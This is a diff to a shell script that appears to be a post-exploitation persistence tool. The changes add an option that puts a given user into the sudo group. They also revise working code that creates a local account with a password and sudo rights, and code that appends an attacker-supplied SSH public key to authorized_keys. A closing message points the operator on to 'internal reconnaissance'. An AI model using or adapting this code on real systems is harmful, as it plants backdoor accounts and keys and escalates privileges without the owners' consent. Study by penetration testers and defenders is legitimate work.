@@ -74,6 +74,11 @@ fuMESSAGE() {
   echo "$BBLUE---$NC $1 $NC"
 }
 
+# Print attention message line
+fuATTENTION() {
+  echo "$BLUE---$YELLOW $1 $NC"
+}
+
 # Check for root permissions
 fuGOT_ROOT() {
 fuINFO "Checking for root"
@@ -94,23 +99,30 @@ fi
 
 PASSED_ARGS=$@
 if [ "$PASSED_ARGS" != "" ]; then
-  while getopts "hs:u:p:" opt; do
+  while getopts "he:s:u:p:" opt; do
     case "$opt" in
       h|\?)
         echo
-        echo "Usage: sh $0 [-h] [-s]"
+        echo "Usage: sh $0 [-h] [-e] [-s] [-u] [-p]"
+        echo
+        echo "-e <username>"
+        echo "  Elevate privileges of the given user"
+        echo "  Root needed!"
         echo
         echo "-s <ssh public key / content of id_rsa.pub>"
         echo "  Trying to add ssh public key to authorized_keys of current user"
         echo
         echo "-u <username>"
-        echo "  Trying to add a local account/user"
+        echo "  Add a local account/user"
+        echo "  Root needed!"
         echo
         echo "-p <password>"
         echo "  Set this password to new user"
-        echo "  Only useful with -u parameter set"
+        echo "  Only useful in combination with -u parameter"
+        echo "  Root needed!"
         echo
         exit;;
+      e) ELEVATEPRIV="1";PRIVUSER=$OPTARG;;
       s) SSH="1";PUBKEY=$OPTARG;;
       u) ADDUSER="1";USERNAME=$OPTARG;;
       p) ADDPW="1";PW=$OPTARG;;
@@ -151,11 +163,18 @@ if [ "$SSH" ]; then
     __  __           _ _  __         ____ ____  _   _   _  __                      
    |  \/  | ___   __| (_)/ _|_   _  / ___/ ___|| | | | | |/ /___ _   _ ___         
    | |\/| |/ _ \ / _\` | | |_| | | | \___ \___ \| |_| | | ' // _ \ | | / __|        
-   | |  | | (_) | (_| | |  _| |_| |  ___) |__) |  _  | | . \  __/ |_| \__ \  _ _ _ 
-   |_|  |_|\___/ \__,_|_|_|  \__, | |____/____/|_| |_| |_|\_\___|\__, |___/ (_|_|_)
+   | |  | | (_) | (_| | |  _| |_| |  ___) |__) |  _  | | . \  __/ |_| \__ \  
+   |_|  |_|\___/ \__,_|_|_|  \__, | |____/____/|_| |_| |_|\_\___|\__, |___/ 
                              |___/                               |___/             
   "
   sleep 1
+
+  # check if sudo
+  if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
+    fuERROR "You are root! Don't run part \"modify ssh keys\" (-s) with \"sudo\""
+    echo
+    exit
+  fi
 
   # check if local ssh server is running
   fuTITLE "Check if local ssh server is running ..."
@@ -171,28 +190,30 @@ if [ "$SSH" ]; then
   # set current user to $USER
   if WHOAMI=$(command -v whoami 2>/dev/null); then
     USER=$($WHOAMI 2>/dev/null)
-    # check if $HOME variable is set
-    if [ ! "$HOME" ]; then
-      if [ -d "/home/$USER" ]; then
-        HOME="/home/$USER"
-      fi
-    fi
   else
     fuERROR "command \"whoami\" not found"
+    # try with who am i
+    #USER=$(who am i | awk '{print $1}' 2>/dev/null)
   fi
-
+  
+  # check if $HOME variable is set
+  if [ ! "$HOME" ]; then
+    if [ -d "/home/$USER" ]; then
+      HOME="/home/$USER"
+    fi
+  fi
+  
   # get local ip addresses
   LOCAL_IP=$(ip a | grep -vi docker | grep -Eo 'inet[^6]\S+[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | awk '{print $2}' | grep -E "^10\.|^172\.|^192\.168\.|^169\.254\.")
 
   fuTITLE "Trying to add given ssh public key to authorized_keys file of user \"$USER\" ..."
   sleep 2
-
   if [ -d "$HOME/.ssh" ]; then
     if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then TRYCHMOD=""; else SSHOK="" && fuERROR "unable to write authorized_keys" && TRYCHMOD="1"; fi
     if [ "$TRYCHMOD" ]; then
       if CHMOD=$(command -v chmod 2>/dev/null); then
         $CHMOD 700 "$HOME"/.ssh 2>/dev/null
-        echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys && SSHOK="1" && fuMESSAGE "authorized_keys updated"
+        echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys && SSHOK="1" && fuINFO "authorized_keys updated"
       else 
         fuERROR "command \"chmod\" not found"
       fi
@@ -203,8 +224,8 @@ if [ "$SSH" ]; then
     fuINFO "No .ssh directory exists, creating one ..."
     MKDIR=$(command -v mkdir 2>/dev/null) || fuERROR "command \"mkdir\" not found"
     CHMOD=$(command -v chmod 2>/dev/null) || fuERROR "command \"chmod\" not found"
-    $MKDIR "$HOME"/.ssh 2>/dev/null && $CHMOD 700 "$HOME"/.ssh 2>/dev/null
-    if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then SSHOK="1" && fuMESSAGE "authorized_keys updated"; else SSHOK="" && fuERROR "unable to write authorized_keys"; fi
+    $MKDIR "$HOME"/.ssh 2>/dev/null && $CHMOD 700 "$HOME"/.ssh 2>/dev/null && $CHMOD 600 "$HOME"/.ssh/authorized_keys 2>/dev/null
+    if echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys; then SSHOK="1" && fuINFO "authorized_keys updated"; else SSHOK="" && fuERROR "unable to write authorized_keys"; fi
   fi
 fi
 
@@ -223,28 +244,29 @@ if [ "$ADDUSER" ]; then
   "
   sleep 1
 
-  # without root
-  #useradd -M -N -r -s /bin/bash #{username}
+  # check -p parameter
+  if [ ! "$ADDPW" ]; then fuERROR "Aborting! No password given. You cannot login to that user until you set a password. Use the -p parameter" && exit; fi
 
   # check if /bin/bash exists
   if [ -f "/bin/bash" ]; then BASH="1"; else BASH=""; fi
 
-  # with root
-  fuTITLE "Trying to add the user \"$USERNAME\" with root privileges ..."
-  sleep 2
-
+  # check commands
   USERADD=$(command -v useradd 2>/dev/null) || fuERROR "command \"useradd\" not found"
   USERMOD=$(command -v usermod 2>/dev/null) || fuERROR "command \"usermod\" not found"
-  
+
+  fuTITLE "Trying to add the user \"$USERNAME\" with root privileges ..."
+  sleep 2
   if [ "$BASH" ]; then
-    if $USERADD -g 0 -M -d /root -s /bin/bash $USERNAME 2>/dev/null; then
-      ADDUSEROK="1" && fuMESSAGE "user \"$USERNAME\" added"
+    #if $USERADD -g 0 -M -d /root -s /bin/bash $USERNAME 2>/dev/null; then
+    if $USERADD -m -s /bin/bash $USERNAME 2>/dev/null; then
+      ADDUSEROK="1" && fuINFO "user \"$USERNAME\" added"
     else
       ADDUSEROK="" && fuERROR "unable to add user \"$USERNAME\". You need root privileges. Try \"sudo sh $0\""
     fi
   else
-    if $USERADD -g 0 -M -d /root -s /bin/sh $USERNAME 2>/dev/null; then
-      ADDUSEROK="1" && fuMESSAGE "user \"$USERNAME\" added"
+    #if $USERADD -g 0 -M -d /root -s /bin/sh $USERNAME 2>/dev/null; then
+    if $USERADD -m -s /bin/sh $USERNAME 2>/dev/null; then
+      ADDUSEROK="1" && fuINFO "user \"$USERNAME\" added"
     else
       ADDUSEROK="" && fuERROR "unable to add user \"$USERNAME\". You need root privileges. Try \"sudo sh $0\""
     fi
@@ -252,28 +274,63 @@ if [ "$ADDUSER" ]; then
   
   if [ "$ADDUSEROK" ]; then
     fuTITLE "Trying to add user \"$USERNAME\" to sudo group ..."
-    sleep 1
+    sleep 2
     if $USERMOD -a -G sudo $USERNAME 2>/dev/null; then
-      fuMESSAGE "user \"$USERNAME\" added to sudo group"
+      fuINFO "user \"$USERNAME\" added to sudo group"
     else
       fuERROR "unable to add user \"$USERNAME\" to sudo group"
     fi
 
     fuTITLE "Trying to add a password to user \"$USERNAME\" ..."
-    sleep 1
+    sleep 2
     if [ "$ADDPW" ]; then
       if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then
         echo "$USERNAME:$PW" | sudo chpasswd
+        fuINFO "given password added to user \"$USERNAME\""
       else
-        echo "$PW" | passwd $USERNAME
+        echo "$PW" | sudo passwd $USERNAME
+        fuINFO "given password added to user \"$USERNAME\""
       fi
-    else
-      fuERROR "No password given. You cannot login with that username until you create a password!!! Try \"sudo sh $0 -p\""
     fi
   fi
 
 elif [ "$ADDPW" ]; then
   fuERROR "No username given. Try to add a user with -u parameter and combine it with -p"
+fi
+
+
+######################
+# Elevate Privileges #
+######################
+
+if [ "$ELEVATEPRIV" ]; then
+  echo "
+   _____ _                 _         ____       _       _ _                      
+  | ____| | _____   ____ _| |_ ___  |  _ \ _ __(_)_   _(_) | ___  __ _  ___  ___ 
+  |  _| | |/ _ \ \ / / _\` | __/ _ \ | |_) | '__| \ \ / / | |/ _ \/ _\` |/ _ \/ __|
+  | |___| |  __/\ V / (_| | ||  __/ |  __/| |  | |\ V /| | |  __/ (_| |  __/\__ \.
+  |_____|_|\___| \_/ \__,_|\__\___| |_|   |_|  |_| \_/ |_|_|\___|\__, |\___||___/
+                                                                  |___/           
+  "
+ 
+  fuTITLE "Trying to add user \"$PRIVUSER\" to sudo group ..."
+  sleep 2
+  # check if given user exists
+  if id -u $PRIVUSER >/dev/null 2>&1; then
+    fuMESSAGE "user $PRIVUSER found"
+    if USERMOD=$(command -v usermod 2>/dev/null); then
+      # add user to sudo group
+      if $USERMOD -a -G sudo $PRIVUSER 2>/dev/null; then
+        ELEVATEPRIVOK="1" && fuINFO "user \"$PRIVUSER\" added to sudo group"
+      else
+        ELEVATEPRIVOK="" && fuERROR "unable to add user \"$PRIVUSER\" to sudo group. Try \"sudo sh $0 ...\""
+      fi
+    else
+      fuERROR "command \"usermod\" not found"
+    fi
+  else
+    fuERROR "user $PRIVUSER not found"
+  fi
 fi
 
 
@@ -296,16 +353,18 @@ if [ "$SSH" ]; then
     for ip in $LOCAL_IP; do
       fuSTEPS "From your Host: Try \"ssh $USER@$ip\""
     done
-  else
-    fuERROR "Modify ssh keys was not successful"
   fi
 fi
 
 if [ "$ADDUSER" ]; then
   if [ "$ADDUSEROK" ]; then
-    fuSTEPS "User $USERNAME added. To login with ssh, switch to new user and run the script again with -s parameter"
-  else
-    fuERROR "Add user was not successful"
+    fuSTEPS "User $USERNAME added. To login with ssh, switch to the new user (su $USERNAME) and run the script again with -s parameter."
+  fi
+fi
+
+if [ "$ELEVATEPRIV" ]; then
+  if [ "$ELEVATEPRIVOK" ]; then
+    fuSTEPS "You already ran this script with sudo! So skip privilege escalation phase and move on to internal reconnaissance."
   fi
 fi
 
